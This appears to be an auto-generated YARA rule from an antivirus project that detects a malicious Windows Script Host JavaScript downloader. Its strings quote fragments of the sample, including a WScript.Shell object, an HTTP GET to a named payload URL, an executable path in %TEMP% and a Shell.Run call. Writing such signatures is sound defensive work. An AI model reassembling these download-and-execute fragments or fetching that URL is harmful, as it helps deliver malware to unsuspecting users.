rule sig_20160330_de00e1147c9a19df6e2ced08d207c627 {
  meta:
    description = "datamaliciousorder - file 20160330_de00e1147c9a19df6e2ced08d207c627.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "e68b7008ce9547b99ec70c67317243eb2b9057b06002ac6d8ff6e00adc89e4a6"

  strings:
    $s1  = "function V(U, I0){JP = JP * 1; return U - I0;};" fullword ascii
    $s2  = "var XL = function AG() {return WScript[B](\"WScript\"+\".Shell\");}(), UY = 11;" fullword ascii
    $s3  = "P0[XN](\"GET\", \"http://vidamparty.hu/as0ldr\", false);" fullword ascii
    $s4  = "if (P0[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function R(){return X + \"\";};" fullword ascii
    $s6  = "function E() {return XL[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"cxSrrU2cHOL.ex\" + \"e\";};" fullword ascii
    $s7  = "function KB() {return ((OD == true) && (OD == IB)) ? 1 : JP;};" fullword ascii
    $s8  = "function DL(L0){XL[\"Run\"](L0, JP, JP);};" fullword ascii
    $s9  = "function L()" fullword ascii
    $s10 = "function F(){return 22;};" fullword ascii
    $s11 = "}while (UQ);" fullword ascii
    $s12 = "function OT(XE) {var GU = (1, 2, 3, 4, 5, XE); return GU;};" fullword ascii
    $s13 = "function SF(){return B;};" fullword ascii
    $s14 = "return V(L1, N);" fullword ascii
    $s15 = "var OJ = new this[\"Date\"]();" fullword ascii
    $s16 = "var Q = false;" fullword ascii
    $s17 = "IB = true; " fullword ascii
    $s18 = "var IB = false;" fullword ascii
    $s19 = "var OD = false;" fullword ascii
    $s20 = "OD = true; " fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}